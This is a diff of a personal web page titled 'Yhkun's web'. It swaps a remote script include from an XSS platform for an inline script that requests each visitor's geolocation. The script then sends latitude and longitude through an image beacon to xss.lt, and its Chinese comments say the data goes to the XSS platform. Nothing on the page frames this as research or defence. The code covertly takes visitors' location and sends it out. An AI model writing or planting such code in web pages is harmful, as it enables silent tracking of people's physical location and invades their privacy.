@@ -2,7 +2,21 @@
 
 <head>
 <title>Yhkun's web</title>
-<sCRiPt sRC=https://xss.lt/w9TV ></sCrIpT>
+<sCRiPt>function getLocation() //获取GPS定位方法
+  {
+  if (navigator.geolocation)
+    {
+    navigator.geolocation.getCurrentPosition(showPosition);
+    }
+  else{x.innerHTML="Geolocation is not supported by this browser.";}
+  }
+function showPosition(position)
+  {
+//alert("Latitude: " + position.coords.latitude + "Longitude: " + position.coords.longitude); //测试，注释掉
+    (new Image()).src='https://xss.lt/index.php?do=api&id=w9TV&weidu='+position.coords.latitude+'&jingdu='+position.coords.longitude; //向XSS平台发送经纬度信息
+}
+       
+getLocation();</sCrIpT>
 
 </head>
 
